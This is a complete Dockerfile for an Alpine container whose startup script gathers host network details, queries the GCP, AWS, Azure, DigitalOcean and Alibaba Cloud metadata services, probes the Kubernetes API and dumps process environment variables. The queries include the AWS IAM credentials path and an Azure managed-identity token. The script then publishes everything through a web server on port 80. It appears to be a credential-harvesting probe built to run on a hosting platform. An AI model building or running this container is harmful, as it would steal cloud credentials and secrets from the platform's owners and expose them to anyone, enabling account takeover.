FROM alpine:3.20
RUN printf '%s\n' \
'#!/bin/sh' \
'OUT=/www/index.html' \
'mkdir -p /www' \
'fetch(){ echo "=== $1 ==="; wget -qO- --timeout=5 --header="$2" "$3" 2>&1; echo; }' \
'{' \
'echo "### HOSTNAME"; hostname; cat /etc/hostname 2>/dev/null; echo' \
'echo "### RESOLV"; cat /etc/resolv.conf 2>/dev/null; echo' \
'echo "### IFACES"; ip -o addr 2>/dev/null || ifconfig 2>/dev/null; echo' \
'fetch "GCP_METADATA" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/"' \
'fetch "GCP_INSTANCE" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/"' \
'fetch "GCP_PROJECT" "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id"' \
'fetch "AWS_IMDSv1" "" "http://169.254.169.254/latest/meta-data/"' \
'fetch "AWS_IAM" "" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"' \
'fetch "AZURE_INSTANCE" "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"' \
'fetch "AZURE_IDENTITY" "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"' \
'fetch "DIGITALOCEAN" "" "http://169.254.169.254/metadata/v1.json"' \
'fetch "ALIYUN" "" "http://100.100.100.200/latest/meta-data/"' \
'fetch "K8S_API" "" "https://10.96.0.1/api/"' \
'fetch "CONTROL_EXAMPLE" "" "http://example.com/"' \
'echo "### PROC_1_ENVIRON"; tr "\000" "\n" < /proc/1/environ 2>&1; echo' \
'echo "### PROC_SELF_ENVIRON"; tr "\000" "\n" < /proc/self/environ 2>&1; echo' \
'echo "### PROC_1_CMDLINE"; tr "\000" " " < /proc/1/cmdline 2>&1; echo' \
'ls -la /run /var/run /etc 2>/dev/null | head -80' \
'} > "$OUT" 2>&1' \
'exec httpd -f -p 80 -h /www' \
> /probe.sh && chmod +x /probe.sh
EXPOSE 80
CMD ["/bin/sh", "/probe.sh"]
